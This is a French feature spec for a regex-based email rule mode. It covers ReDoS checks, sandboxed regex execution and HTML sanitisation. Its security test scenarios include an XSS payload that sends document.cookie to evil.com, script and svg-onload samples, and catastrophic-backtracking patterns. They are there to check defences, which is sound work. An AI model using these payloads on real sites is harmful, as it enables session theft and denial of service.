# Feature Spec — Regex Power & Validation Visuelle

**Phase 3 (AMC Lifecycle) — input pour Phase 4 (TDD Red).**

Extension de [custom-actions](./custom-actions.md) v0.5.0. Spec exhaustive Given/When/Then, alignée sur le [Big Picture](../big-picture/regex-power/) (Phase 1, 4 décisions D1-D4 verrouillées) et l'[Architecture](../architecture/regex-power/) (Phase 2, 3 ADRs + ERD + API contracts).

---

## 1. Context

### Personas couverts
- **Léa** (freelance dev) — power user qui maîtrise regex, veut contrôler 100% des règles d'extraction (`PR #\d+`, `merge[d]?\s+request`)
- **Camille** (manager) — non-tech, utilise les templates métier prédéfinis (1-to-1, daily stand-up, validation budget)
- **Sophie** (comptable) — non-tech, dépend des templates métier compta (FAC-XXXX, devis-XXXX, virement)

### Epics couverts
- Epic 1 — Modèle DB étendu (`mode` enum, `regexPattern`, `validated`)
- Epic 2 — UI Settings : toggle mode + zone de test inline
- Epic 3 — UI missing-action : preview live sur corps email complet
- Epic 4 — Templates métier prédéfinis (catalogue statique)

### Pourquoi maintenant
Les keywords couvrent les besoins basiques mais pas les patterns structurés (numéros de facture, références de tickets, formats métier). Le mode regex avancé + validation visuelle inline positionne Inbox Actions comme **outil pro** (vs concurrence IA black-box). Préserve la philosophie « transparence + déterminisme » : la regex est l'incarnation parfaite (zéro magie, 100% explicable, debuggable).

---

## 2. User Stories

### US-1 — Toggle vers le mode regex avancé (Epic 2)

**En tant que** power user **je veux** activer un mode regex avancé sur la création/édition d'un type custom **afin de** définir mes patterns sans la limitation des keywords simples.

#### Scénario US-1.1 — Activation toggle
- **Given** je suis sur le dialog création de type custom (Settings ou missing-action)
- **And** le mode est par défaut KEYWORDS (toggle off)
- **When** je clique le toggle "Activer le mode regex avancé"
- **Then** le champ `Keywords` est masqué
- **And** un champ `Pattern regex` apparaît avec placeholder `Ex: FAC-\d{4}-\d+`
- **And** un bouton "Templates métier" apparaît (Epic 4)
- **And** le state interne du form passe `mode = "REGEX"`

#### Scénario US-1.2 — Désactivation
- **Given** le toggle est ON, j'ai saisi un pattern
- **When** je désactive le toggle
- **Then** le pattern est effacé du state local
- **And** le champ `Keywords` réapparaît (vide)
- **And** `mode = "KEYWORDS"` dans le state form

#### Scénario US-1.3 — Édition d'un type REGEX existant
- **Given** un type custom `Facture` créé en mode REGEX (`pattern: "FAC-\\d{4}-\\d+"`)
- **When** j'ouvre le dialog d'édition
- **Then** le toggle est déjà ON
- **And** le champ pattern est pré-rempli avec `FAC-\d{4}-\d+`
- **And** le bouton "Templates métier" reste accessible (override possible)

---

### US-2 — Créer un type custom en mode regex (Epic 1+2)

**En tant que** power user **je veux** créer un type custom avec un pattern regex validé **afin de** détecter des structures précises dans mes emails.

#### Scénario US-2.1 — Création nominale
- **Given** je suis dans le dialog en mode REGEX
- **And** je saisis nom = `Facture client`, pattern = `FAC-\d{4}-\d+`, couleur = `amber`
- **When** je valide
- **Then** `POST /api/custom-action-types` est appelé avec body `{ name, mode: "REGEX", regexPattern, color }`
- **And** côté serveur, `safe-regex(pattern)` retourne true
- **And** `prisma.create({ ..., validated: true })` réussit
- **And** réponse 201 avec `{ type: { id, name, mode: "REGEX", regexPattern, validated: true, color: "amber", isActive: true } }`
- **And** la card du type apparaît dans la liste avec un badge `regex` discret

#### Scénario US-2.2 — Pattern dangereux ReDoS
- **Given** je saisis pattern = `(.*)*` ou `(a+)+`
- **When** je valide
- **Then** `safe-regex(pattern)` retourne false côté serveur
- **And** réponse 422 `{ error: "Pattern dangereux", reason: "polynomial_backtracking" }`
- **And** le toast affiche "Pattern dangereux : utilisez une alternative non-récursive"
- **And** rien n'est créé en base (`validated` reste à false par défaut)

#### Scénario US-2.3 — Pattern syntaxe invalide
- **Given** je saisis pattern = `(unclosed[group` (parenthèse manquante)
- **When** je valide
- **Then** `safe-regex` peut passer (vérifie la complexité, pas la syntaxe)
- **And** côté serveur, `new RegExp(pattern, 'gi')` throw SyntaxError
- **And** réponse 422 `{ error: "Pattern syntax invalide", details: "Unterminated character class" }`

#### Scénario US-2.4 — Pattern > 200 chars
- **Given** je saisis un pattern de 201 chars
- **When** je valide
- **Then** Zod reject (max 200) → 422 `{ error: "Pattern trop long (max 200 chars)" }`

#### Scénario US-2.5 — Pattern vide en mode REGEX
- **Given** mode = REGEX, pattern = `""`
- **When** je valide
- **Then** Zod reject (min 1) → 422

#### Scénario US-2.6 — Keywords fournis en mode REGEX
- **Given** je tente un POST avec `mode: "REGEX"`, `regexPattern: "..."`, et `keywords: [...]` (incohérent)
- **When** la requête arrive
- **Then** Zod discriminated union reject → 422 `{ error: "keywords interdit en mode REGEX" }`

---

### US-3 — Tester une regex en zone de test (Epic 2 + 3)

**En tant qu'**utilisateur **je veux** voir en temps réel quelles phrases matchent mon pattern **afin de** valider visuellement ma règle avant de l'enregistrer.

#### Scénario US-3.1 — Test nominal Settings
- **Given** je suis sur le dialog en mode REGEX, j'ai saisi pattern = `FAC-\d{4}-\d+`
- **And** j'ai collé 3 phrases dans la textarea de test
- **When** la dernière modification de pattern (ou textarea) déclenche le debounce 300ms
- **Then** `POST /api/custom-action-types/test-regex` est appelé avec `{ pattern, testText: ["...", "...", "..."] }`
- **And** réponse 200 avec `{ matches: [{ textIndex: 0, ranges: [[5, 16]] }, ...] }`
- **And** le composant `<MatchHighlighter />` rend chaque phrase avec `<mark>` autour des matches
- **And** une jauge "X matches sur 3 phrases" est affichée

#### Scénario US-3.2 — Pattern sans match
- **Given** pattern = `FAC-\d{4}-\d+`, testText = `["rien à voir ici"]`
- **When** API test-regex appelé
- **Then** réponse 200 `{ matches: [{ textIndex: 0, ranges: [] }] }`
- **And** UI affiche "Aucun match" en gris

#### Scénario US-3.3 — Timeout au test
- **Given** pattern = `(a+)+b`, testText = `["aaaaaaaaaaaaaaaaaaaaaaac"]` (ReDoS-prone)
- **When** API test-regex tente l'exécution
- **Then** `safe-regex` rejette avant exec → 422 OU `vm.runInNewContext` timeout 100ms → 408
- **And** UI affiche "Pattern trop complexe (timeout)" en rouge avec icône warning

#### Scénario US-3.4 — Debounce 300ms
- **Given** je tape rapidement 5 modifications du pattern en 200ms
- **When** la dernière saisie est terminée
- **Then** **un seul** appel API test-regex est lancé (300ms après la dernière saisie)
- **And** les 4 saisies intermédiaires sont jetées

#### Scénario US-3.5 — Cache UI mémoire
- **Given** j'ai testé pattern = `FOO` sur testText = `["bar"]`
- **And** je modifie le pattern puis reviens à `FOO` sur le même texte
- **When** le debounce expire
- **Then** **aucun** appel API n'est fait
- **And** les ranges précédents sont réutilisés depuis le cache mémoire keyé `pattern + textHash`

---

### US-4 — Visualiser les matches dans un email réel (Epic 3 missing-action)

**En tant qu'**utilisateur **je veux** voir les matches de ma regex sur le corps complet d'un email réel **afin de** valider que ma règle attrape bien le cas pour lequel je la crée.

#### Scénario US-4.1 — Preview live nominale
- **Given** je suis sur `/missing-action`, j'ai cliqué sur un email
- **And** dans le dialog, j'ai sélectionné "Créer un nouveau type" + activé "Mode regex avancé"
- **And** je tape pattern = `FAC-\d{4}-\d+`
- **When** le debounce 300ms expire
- **Then** `GET /api/email/[id]/body` est appelé (1ère fois) → skeleton loader visible
- **And** `POST /api/custom-action-types/test-regex` avec `testText: [emailBody]` est appelé en parallèle
- **And** une fois les 2 réponses reçues, le corps de l'email est rendu avec `<mark>` aux positions des matches (jaune surbrillance)
- **And** une jauge "N matches dans ce mail" est affichée

#### Scénario US-4.2 — Body cached (TTL 5min)
- **Given** j'ai déjà fetché le body d'un email il y a 2 min
- **When** je tape une nouvelle modification de pattern → re-test
- **Then** `GET /api/email/[id]/body` répond en < 50ms (cache RAM hit)
- **And** aucun appel IMAP/Graph n'est fait

#### Scénario US-4.3 — Email > 50 KB
- **Given** un email de 80 KB
- **When** GET body est appelé
- **Then** réponse 200 avec `body: <50KB tronqué>, truncated: true, mimeType: ...`
- **And** UI affiche une note discrète : "Aperçu limité à 50 KB sur 80 KB"

#### Scénario US-4.4 — Token IMAP/Graph expiré
- **Given** mon token Microsoft Graph est expiré (refresh failed)
- **When** GET body est appelé
- **Then** réponse 503 `{ error: "Token expiré, reconnectez votre boîte mail" }`
- **And** UI affiche un toast d'erreur avec un lien "Aller dans Settings"
- **And** le body affiché est vide avec un placeholder

#### Scénario US-4.5 — Email HTML sanitization
- **Given** un email avec `<p>Hello</p><script>alert(1)</script>`
- **When** GET body est appelé
- **Then** DOMPurify strip `<script>`, conserve `<p>`
- **And** la réponse contient `body: "<p>Hello</p>", mimeType: "text/html"`
- **And** UI rend le HTML sanitized (pas via `dangerouslySetInnerHTML` mais via parser sécurisé OU `textContent` pour highlight)

#### Scénario US-4.6 — Tentative XSS reflected
- **Given** un email avec `<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">`
- **When** GET body + render
- **Then** DOMPurify strip l'attribut `onerror`
- **And** **aucun** JS n'est exécuté côté navigateur (verifié dans tests E2E)
- **And** réseau monitor : 0 requête vers evil.com

---

### US-5 — Détection regex au scan (Epic 1 — pipeline extracteur)

**En tant qu'**utilisateur **je veux** que mes types custom mode REGEX soient appliqués lors du scan automatique **afin que** les emails matchant créent des Actions (cohérent avec mode KEYWORDS).

#### Scénario US-5.1 — Détection nominale
- **Given** un type custom `Facture client` avec `mode: REGEX`, `regexPattern: "FAC-\\d{4}-\\d+"`, `validated: true`, `isActive: true`
- **And** un email "Bonjour, voir FAC-2024-0042 jointe avant vendredi"
- **When** le cron `daily-sync` ou `/api/email/analyze` tourne
- **Then** `extractActionsFromEmail` charge ce type custom (filter `validated: true AND isActive: true`)
- **And** `compileSafeUserRegex(regexPattern)` exécute via `vm.runInNewContext` timeout 200ms
- **And** match détecté + gating anti-ambiguïté OK (deadline présente)
- **And** Action créée avec `type: "CUSTOM"`, `customTypeId`, `customTypeLabel: "Facture client"`, `customTypeColor: "amber"` (snapshots), `dueDate: <vendredi>`

#### Scénario US-5.2 — `validated: false` ignoré
- **Given** un type custom REGEX avec `validated: false` (ex: pattern dangereux ajouté manuellement en DB par migration)
- **When** le scan tourne
- **Then** la query Prisma `findMany({ where: { userId, isActive: true, validated: true } })` exclut ce type
- **And** aucune Action n'est créée pour ce type même si un email matchait

#### Scénario US-5.3 — `isActive: false` ignoré
- **Given** un type custom REGEX désactivé via toggle
- **When** scan tourne
- **Then** type ignoré (filter `isActive: true`)

#### Scénario US-5.4 — Timeout runtime au scan
- **Given** un type custom REGEX qui passe `safe-regex` à la création (faux négatif heuristique) mais explose au scan sur un email pathologique
- **When** scan tourne sur cet email
- **Then** `vm.runInNewContext` throw `Script execution timed out`
- **And** try/catch capture l'exception
- **And** `console.warn` log avec `customTypeId` + `emailId`
- **And** **scan continue** sur les autres types et autres emails (pas de crash)
- **And** aucune Action créée pour cet email pour ce type

#### Scénario US-5.5 — Gating anti-ambiguïté partagé
- **Given** type REGEX `FAC-\d{4}-\d+` actif
- **And** email "si tu as le temps, peux-tu vérifier FAC-2024-0042 ?" (conditionnel faible)
- **When** scan tourne
- **Then** match brut détecté MAIS gating `isConcreteEnough` rejette (conditionnel "si tu as le temps")
- **And** **aucune** Action créée (cohérent avec gating natif et keywords)

#### Scénario US-5.6 — Backward compat KEYWORDS
- **Given** un type custom existant en mode KEYWORDS (créé avant regex-power)
- **When** scan tourne
- **Then** comportement identique à v0.5.0 (extracteur switche sur `compileKeywordsRegex`)
- **And** les 259 tests existants restent verts

---

### US-6 — Sélectionner un template métier (Epic 4)

**En tant qu'**utilisateur non-tech **je veux** choisir un template regex prédéfini par métier **afin de** créer une règle puissante sans connaître la regex.

#### Scénario US-6.1 — Sélection nominale
- **Given** je suis dans le dialog en mode REGEX
- **When** je clique le bouton "Templates métier"
- **Then** un sous-menu s'ouvre avec catégories : `Compta` / `Juridique` / `IT` / `RH`
- **And** je sélectionne `Compta > Facture FAC-XXXX`
- **And** le champ pattern se pré-remplit avec `FAC-\d{4}-\d+`
- **And** le nom suggéré "Facture client" pré-remplit le champ nom (si vide)
- **And** la couleur thématique `amber` est pré-sélectionnée

#### Scénario US-6.2 — Customisation post-template
- **Given** template Facture sélectionné
- **When** je modifie le pattern en `FAC-2025-\d+` (filtre année 2025)
- **Then** le state form contient le pattern modifié (le template n'est qu'un point de départ)
- **And** `safe-regex` est re-validé sur le nouveau pattern à la submit

#### Scénario US-6.3 — Pas de template adapté
- **Given** aucune catégorie ne correspond à mon métier (ex: agriculture)
- **When** je ferme le picker sans sélectionner
- **Then** le formulaire reste vide → je tape ma propre regex
- **And** un lien discret "Suggérer un template" pointe vers le formulaire de contact (V2)

#### Scénario US-6.4 — Validation des templates au build
- **Given** le catalogue `lib/regex-templates.ts` contient 15 templates
- **When** la suite de tests `tests/lib/regex-templates.test.ts` tourne
- **Then** chaque template passe `isPatternSafe()` (safe-regex)
- **And** chaque template a un `name`, `pattern`, `color` valide, `category` parmi les 4

---

### US-7 — Modifier un type custom existant en mode regex (Epic 2)

**En tant qu'**utilisateur **je veux** modifier un type REGEX (rename, change pattern, change mode) **afin de** affiner mes règles sans devoir tout recréer.

#### Scénario US-7.1 — Rename + change pattern
- **Given** un type `Facture` (REGEX, pattern `FAC-\d{4}-\d+`)
- **When** je modifie le nom en `Facture 2025` et le pattern en `FAC-2025-\d+`
- **Then** PATCH renvoie 200 avec `validated: true` (re-validation safe-regex OK)
- **And** Actions historiques gardent leur snapshot label `Facture`, color initial

#### Scénario US-7.2 — Change mode KEYWORDS → REGEX
- **Given** un type `Daily stand-up` en KEYWORDS (`["stand-up", "daily", "morning sync"]`)
- **When** je toggle en REGEX et saisis pattern `stand[\s-]*up`
- **Then** PATCH avec `mode: "REGEX"`, `regexPattern: "stand[\\s-]*up"`, `keywords: null` (effacé)
- **And** safe-regex passe → `validated: true`
- **And** réponse 200

#### Scénario US-7.3 — Change mode REGEX → KEYWORDS
- **Given** un type REGEX
- **When** je désactive le toggle, ressaisis 2 keywords
- **Then** PATCH avec `mode: "KEYWORDS"`, `regexPattern: null`, `keywords: [...]`
- **And** réponse 200

#### Scénario US-7.4 — Rename uniquement (pattern inchangé)
- **Given** un type REGEX validé
- **When** je modifie uniquement le nom
- **Then** PATCH avec `name` uniquement
- **And** safe-regex N'est PAS re-exécuté (optimisation : pattern inchangé)
- **And** `validated` reste à `true`

---

### US-8 — Suppression / désactivation (héritage custom-actions)

**Inchangé** vs custom-actions (US-3, US-4 du doc spec custom-actions). Snapshot pattern garantit que les Actions historiques restent lisibles. Le pattern n'est PAS snapshotté sur Action (info type-level uniquement).

---

## 3. Acceptance Criteria globaux

| ID | Critère | Mesure / Test |
|---|---|---|
| AC-1 | Pattern dangereux ReDoS rejeté à la création | `(a+)+` → POST 422 |
| AC-2 | Pattern > 200 chars rejeté | Zod 422 |
| AC-3 | Pattern syntax invalide rejeté | `(unclosed` → 422 (RegExp throw) |
| AC-4 | `validated: true` ssi safe-regex passe | check DB après POST/PATCH |
| AC-5 | Extracteur ne charge que `validated: true` AND `isActive: true` | query Prisma filter |
| AC-6 | Timeout runtime 200ms → skip email + scan continue | injection ReDoS au scan |
| AC-7 | test-regex retourne ranges `[start, end]` corrects | match position exacte |
| AC-8 | test-regex retourne 408 sur timeout | testText avec ReDoS |
| AC-9 | email body endpoint vérifie ownership | user A → email B → 404 |
| AC-10 | email body tronqué à 50 KB | `truncated: true` flag |
| AC-11 | HTML email sanitize via DOMPurify | `<script>` strippé |
| AC-12 | Cache email body TTL 5min | 2ème call < TTL = 0 fetch provider |
| AC-13 | Mode KEYWORDS reste backward-compatible | 259 tests existants verts |
| AC-14 | Templates métier valident safe-regex | suite test catalogue |
| AC-15 | TypeScript strict OK | `tsc --noEmit` exit 0 |

---

## 4. Edge Cases

### 4.1 — Invalid input

| Cas | Comportement |
|---|---|
| Pattern lookbehind `(?<=foo)bar` | Supporté en V8 Node → safe-regex passe → OK |
| Pattern Unicode `\p{L}` sans flag `u` | Invalid syntax → 422 |
| testText non array (string seule) | Zod reject → 422 |
| testText avec chaîne vide | Match impossible mais accepté (`ranges: []`) |
| Pattern avec backslash mal échappé en JSON | RegExp constructor throw → 422 |
| Pattern avec tab/newline littéraux | Accepté tel quel |

### 4.2 — Empty data

| Cas | Comportement |
|---|---|
| User sans types REGEX actifs | Extracteur skip phase REGEX, KEYWORDS continue |
| Email body vide | Matches vides retournés (200 OK) |
| Aucune phrase de test (testText.length === 0) | Zod reject min 1 → 422 |
| Catalogue templates vide (impossible normalement) | UI garde-fou : message "Aucun template" |

### 4.3 — Unauthorized / forbidden

| Cas | Code |
|---|---|
| POST test-regex sans session | 401 |
| GET email body sans session | 401 |
| GET email body cross-user | 404 (pas 403, anti-enumeration) |
| PATCH custom-action-type cross-user | 403 (existant custom-actions) |

### 4.4 — Concurrency

| Cas | Comportement |
|---|---|
| 2 PATCH simultanés sur le même type (2 onglets) | last-write-wins (pas de versioning au MVP) |
| 10 requêtes test-regex parallèles | Toutes traitées (pas de file d'attente) |
| Cache email body : 2 GET concurrents | Singleton-flight optionnel V2 (au MVP : 2 fetches OK) |
| Scan en cours pendant qu'un user désactive un type | Scan termine avec types chargés ; scan suivant les ignore |

### 4.5 — State transitions

| Cas | Comportement |
|---|---|
| Type `validated: true` → `false` après PATCH dangereux | Extracteur skip dès la prochaine query |
| Type désactivé pendant scan | Scan en cours OK (déjà chargé) ; suivant ignore |
| Email supprimé pendant test (TTL expire) | 404 au refetch |

### 4.6 — Security

| Cas | Comportement |
|---|---|
| Pattern DoS V8 `(a+a+)+$` sur longue chaîne | safe-regex reject OU vm timeout |
| Pattern injection code (`new Function`) | Impossible : que `RegExp` constructor + `vm` |
| HTML email `<svg onload=...>` | DOMPurify strip onload |
| XSS reflected via test-regex response | Réponse JSON pure, pas rendue HTML |
| ReDoS via testText 5KB répété | vm timeout 100ms catch |
| Token IMAP/Graph leak via 503 message | Message générique, ne contient pas le token |

### 4.7 — Snapshot integrity

| Cas | Comportement |
|---|---|
| Type passe KEYWORDS → REGEX | Actions historiques inchangées (snapshot label/color) |
| Pattern modifié | Pas de re-scan rétroactif (cohérent ADR-001 custom-actions) |
| Type supprimé | Snapshot intact, FK `customTypeId` nullifié (cohérent custom-actions ADR-001) |

---

## 5. Impacted Files

| Fichier | Action | Notes |
|---|---|---|
| `prisma/schema.prisma` | MODIFY | Enum `CustomActionTypeMode` + 3 colonnes (`mode`, `regexPattern`, `validated`) + index étendu |
| `prisma/migrations/<date>_regex_power/migration.sql` | CREATE | Migration + UPDATE défaut `validated: true` pour types KEYWORDS existants |
| `package.json` | MODIFY | Ajout dep `safe-regex` + `isomorphic-dompurify` |
| `lib/custom-action-types/validation.ts` | MODIFY | Ajout `validateRegexPattern(pattern)` (safe-regex check) |
| `lib/actions/regex-executor.ts` | CREATE | `safelyExecuteRegex(pattern, text, timeoutMs)` via vm + `isPatternSafe(pattern)` |
| `lib/actions/extract-actions-regex.ts` | MODIFY | `extractCustomActionsFromEmail` switch mode + sandbox + skip email on timeout |
| `lib/regex-templates.ts` | CREATE | Catalogue ~10-15 templates par métier (Compta/Juridique/IT/RH) |
| `lib/email-body-cache.ts` | CREATE | Map LRU per-user TTL 5min |
| `app/api/custom-action-types/route.ts` | MODIFY | POST avec discriminated union mode + safe-regex check |
| `app/api/custom-action-types/[id]/route.ts` | MODIFY | PATCH idem |
| `app/api/custom-action-types/test-regex/route.ts` | CREATE | POST endpoint zone de test |
| `app/api/email/[id]/body/route.ts` | CREATE | GET endpoint corps email avec ownership + cache + sanitize |
| `components/settings/custom-action-types-section.tsx` | MODIFY | Toggle mode + champ regex unifié + zone de test inline |
| `components/settings/regex-template-picker.tsx` | CREATE | Picker templates métier par catégories |
| `components/actions/match-highlighter.tsx` | CREATE | Helper visuel : text + ranges → render avec `<mark>` |
| `app/(protected)/missing-action/page.tsx` | MODIFY | Preview live + appel test-regex + email body fetch + debounce 300ms |
| `tests/lib/regex-executor.test.ts` | CREATE | Sandbox + timeout + ReDoS injection (Phase 4 RED) |
| `tests/lib/regex-templates.test.ts` | CREATE | Tous templates valident safe-regex |
| `tests/api/test-regex.test.ts` | CREATE | Endpoint test-regex (auth, validation, timeout, ranges) |
| `tests/api/email-body.test.ts` | CREATE | Endpoint body (ownership, cache, sanitize, truncation) |
| `tests/api/custom-action-types-regex.test.ts` | CREATE | Extension POST/PATCH avec mode REGEX (Zod discriminated, safe-regex) |
| `tests/extract-custom-regex.test.ts` | CREATE | Extracteur en mode REGEX + timeout runtime |

---

## 6. API Contract — résumé

Détails complets dans [`docs/architecture/regex-power/api-contracts.md`](../architecture/regex-power/api-contracts.md).

| Endpoint | Method | Status codes |
|---|---|---|
| `/api/custom-action-types/test-regex` | POST | 200 / 401 / 408 / 422 |
| `/api/email/[id]/body` | GET | 200 / 401 / 404 / 503 |
| `/api/custom-action-types` | POST (étendu) | 201 / 400 / 401 / 409 / 422 |
| `/api/custom-action-types/[id]` | PATCH (étendu) | 200 / 401 / 403 / 404 / 409 / 422 |

---

## 7. Data Model Changes — résumé

Détails complets dans [`docs/architecture/regex-power/data-model.md`](../architecture/regex-power/data-model.md).

| Entité | Changement |
|---|---|
| `CustomActionTypeMode` (enum) | NEW — `KEYWORDS | REGEX` |
| `CustomActionType.mode` | NEW — default KEYWORDS |
| `CustomActionType.regexPattern` | NEW — String? max 200 chars |
| `CustomActionType.validated` | NEW — Boolean default false |
| `@@index([userId, isActive, validated])` | NEW — extracteur filter |

Migration : tous les types existants en KEYWORDS sont auto-marqués `validated: true` (rétro-compat).

---

## 8. Out of Scope (V1 MVP regex-power)

- ❌ `re2` lib native (compatibilité serverless, voir ADR-005)
- ❌ Exécution regex côté client (cohérence + sécurité, voir ADR-007)
- ❌ Templates métier en DB (fichier statique au MVP)
- ❌ Re-scan rétroactif des emails après modification d'un pattern
- ❌ Sharing / marketplace de patterns entre users (V2)
- ❌ Profiler de regex (V2)
- ❌ Groupes de capture nommés exposés dans le titre de l'Action (V2)
- ❌ Auto-détection regex vs keywords sur un champ unique (D2 explicit)
- ❌ Support `\p{...}` Unicode property escapes en mode REGEX par défaut (l'utilisateur doit ajouter le flag — pas exposé via API pour MVP)

---

## 9. Open Questions

**Aucune** — les 4 OQ du Big Picture (D1 anti-ReDoS, D2 mode défaut, D3 visualisation, D4 templates) sont toutes verrouillées en Phase 1 + Phase 2.

---

## Gate Phase 3 — statut

| Critère | Statut |
|---|---|
| Chaque US a au moins 1 scénario Given/When/Then | ✅ 8 US × 3-7 |
| Chaque AC est testable | ✅ 15/15 |
| Impacted files = paths réels | ✅ aligné architecture Phase 2 |
| Edge cases couvrent invalid/empty/unauthorized/concurrency/state/security/snapshot | ✅ 7 catégories |

**Phase 4 — TDD Red** (`/amc-dev-lifecycle:tdd-red-phase`) peut démarrer.
